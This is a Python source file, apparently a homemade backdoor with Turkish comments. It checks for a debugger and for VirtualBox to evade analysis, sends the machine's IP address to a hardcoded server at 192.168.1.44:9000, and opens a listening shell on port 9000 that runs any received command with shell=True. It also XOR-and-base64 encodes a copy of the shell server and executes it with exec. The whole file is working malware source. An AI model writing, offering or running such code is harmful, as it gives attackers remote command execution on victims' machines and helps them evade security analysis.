import socket
import threading
import subprocess
import base64
import ctypes
import platform
import random

def dynamic_code():
    operations = ["+", "-", "*", "/"]
    code = f"x = 10 {random.choice(operations)} 5\n"
    code += "print(x)\n"
    return code

# Dinamik kod üretimini tetikle
dynamic_part = dynamic_code()
exec(dynamic_part)

def encrypt_code(code):
    key = random.randint(1, 256)
    return base64.b64encode(''.join(chr(ord(c) ^ key) for c in code).encode()).decode(), key

def decrypt_code(encrypted_code, key):
    return ''.join(chr(ord(c) ^ key) for c in base64.b64decode(encrypted_code).decode())

def get_ip_address():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        print(f"IP Address: {ip_address}")  # Debug print
        return ip_address
    except Exception as e:
        print(f"IP address error: {e}")
        return "IP not found"

def send_ip_to_server(ip_address, server_ip, server_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))
        client.send(ip_address.encode())
        client.close()
        print(f"Sent IP Address {ip_address} to server {server_ip}:{server_port}")  # Debug print
    except Exception as e:
        print(f"IP sending error: {e}")

def handle_client(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if command.lower() in ['exit', 'quit']:
                break
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client_socket.send(output)
        except Exception as e:
            client_socket.send(str(e).encode())
            break
    client_socket.close()

def start_server(host, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Listening on {host}:{port}")  # Debug print

        while True:
            client_socket, addr = server.accept()
            print(f"[*] Accepted connection from {addr}")  # Debug print
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
    except Exception as e:
        print(f"Server error: {e}")

def check_debugger():
    try:
        is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
        if is_debugger_present:
            raise SystemExit("Debugger detected!")
        print("Debugger check passed")  # Debug print
    except Exception as e:
        print(f"Debugger check failed: {e}")

def check_virtualization():
    try:
        if 'VirtualBox' in platform.uname().release:
            raise SystemExit("Virtual machine detected!")
        print("Virtualization check passed")  # Debug print
    except Exception as e:
        print(f"Virtualization check failed: {e}")

def obfuscated_code():
    # Örnek olarak, random bir anahtar kullanarak kodu şifrele
    original_code = (
        "import socket\n"
        "import threading\n"
        "import subprocess\n\n"
        "def handle_client(client_socket):\n"
        "    while True:\n"
        "        try:\n"
        "            command = client_socket.recv(1024).decode()\n"
        "            if command.lower() in ['exit', 'quit']:\n"
        "                break\n"
        "            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)\n"
        "            client_socket.send(output)\n"
        "        except Exception as e:\n"
        "            client_socket.send(str(e).encode())\n"
        "            break\n"
        "    client_socket.close()\n\n"
        "def start_server(host, port):\n"
        "    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    server.bind((host, port))\n"
        "    server.listen(5)\n"
        "    print(f\"[*] Listening on {host}:{port}\")\n\n"
        "    while True:\n"
        "        client_socket, addr = server.accept()\n"
        "        print(f\"[*] Accepted connection from {addr}\")\n"
        "        client_handler = threading.Thread(target=handle_client, args=(client_socket,))\n"
        "        client_handler.start()\n\n"
        "if __name__ == '__main__':\n"
        "    start_server('0.0.0.0', 9000)\n"
    )
    
    encrypted_code, key = encrypt_code(original_code)
    
    print("Decrypted code for execution:")  # Debug print
    print(decrypt_code(encrypted_code, key))  # Debug print
    
    # Şifreyi çöz ve çalıştır
    try:
        exec(decrypt_code(encrypted_code, key))
    except Exception as e:
        print(f"Error executing obfuscated code: {e}")

if __name__ == "__main__":
    check_debugger()
    check_virtualization()

    target_server_ip = '192.168.1.44'
    target_server_port = 9000

    ip_address = get_ip_address()
    send_ip_to_server(ip_address, target_server_ip, target_server_port)
    
    host = "0.0.0.0"
    port = 9000
    start_server(host, port)
